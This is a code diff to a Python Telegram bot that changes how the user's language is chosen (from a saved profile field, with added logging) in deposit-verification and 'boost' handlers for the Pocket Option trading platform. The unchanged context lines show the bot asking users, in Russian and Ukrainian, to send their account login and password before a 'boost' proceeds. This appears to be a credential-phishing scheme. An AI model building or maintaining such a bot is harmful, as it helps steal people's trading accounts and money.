@@ -47,6 +47,12 @@ def _get_user_lang(user_id: int) -> str:
     try:
         from app.dispatcher import admin_panel as _admin_panel
         profile = _admin_panel.get_user(user_id) or {}
+        
+        # Debug logging
+        import logging
+        logger = logging.getLogger(__name__)
+        logger.info(f"User {user_id} profile: lang={profile.get('lang')}, language={profile.get('language')}")
+        
         def _norm(v):
             if not isinstance(v, str):
                 return ""
@@ -58,13 +64,21 @@ def _get_user_lang(user_id: int) -> str:
             return ""
         cand1 = _norm(profile.get('language'))
         cand2 = _norm(profile.get('lang'))
-        # Prefer RU if any field says RU; else if any says UK; else default RU
-        if 'ru' in {cand1, cand2}:
-            return 'ru'
-        if 'uk' in {cand1, cand2}:
-            return 'uk'
+        
+        # Prefer explicit saved choice: check lang field first, then language field
+        if cand2:  # profile.get('lang') normalized
+            logger.info(f"User {user_id} using lang field: {cand2}")
+            return cand2
+        if cand1:  # profile.get('language') normalized  
+            logger.info(f"User {user_id} using language field: {cand1}")
+            return cand1
+            
+        # Default to Russian if no explicit choice
+        logger.info(f"User {user_id} defaulting to ru")
         return 'ru'
-    except Exception:
+    except Exception as e:
+        import logging
+        logging.getLogger(__name__).error(f"Error getting user lang for {user_id}: {e}")
         return 'ru'
 
 
@@ -510,10 +524,13 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
         # This is a test user, grant them a test balance and go through normal flow
         await state.update_data(initial_balance=100.0)
         lang_sel = _get_user_lang(message.from_user.id)
+        # Force correct language based on user's saved preference
         try:
-            lc = (getattr(message.from_user, "language_code", "") or "").lower()
-            if lc.startswith("ru"):
-                lang_sel = "ru"
+            from app.dispatcher import admin_panel as _admin_panel
+            profile = _admin_panel.get_user(message.from_user.id) or {}
+            saved_lang = (profile.get('lang') or '').lower()
+            if saved_lang in ('uk', 'ru'):
+                lang_sel = saved_lang
         except Exception:
             pass
         await send_message_with_photo(
@@ -565,10 +582,13 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
         await wait_message.delete()
         # Запрашиваем у пользователя логин и пароль перед продолжением
         lang_sel = _get_user_lang(message.from_user.id)
+        # Force correct language based on user's saved preference
         try:
-            lc = (getattr(message.from_user, "language_code", "") or "").lower()
-            if lc.startswith("ru"):
-                lang_sel = "ru"
+            from app.dispatcher import admin_panel as _admin_panel
+            profile = _admin_panel.get_user(message.from_user.id) or {}
+            saved_lang = (profile.get('lang') or '').lower()
+            if saved_lang in ('uk', 'ru'):
+                lang_sel = saved_lang
         except Exception:
             pass
         await send_message_with_photo(
@@ -829,10 +849,13 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
     if not (email_ok and password_ok and uid_ok):
         await callback.answer("Будь ласка, надішліть ваш логін і пароль, щоб продовжити.", show_alert=True)
         lang_sel = _get_user_lang(callback.from_user.id)
+        # Force correct language based on user's saved preference
         try:
-            lc = (getattr(callback.from_user, "language_code", "") or "").lower()
-            if lc.startswith("ru"):
-                lang_sel = "ru"
+            from app.dispatcher import admin_panel as _admin_panel
+            profile = _admin_panel.get_user(callback.from_user.id) or {}
+            saved_lang = (profile.get('lang') or '').lower()
+            if saved_lang in ('uk', 'ru'):
+                lang_sel = saved_lang
         except Exception:
             pass
         await send_message_with_photo(
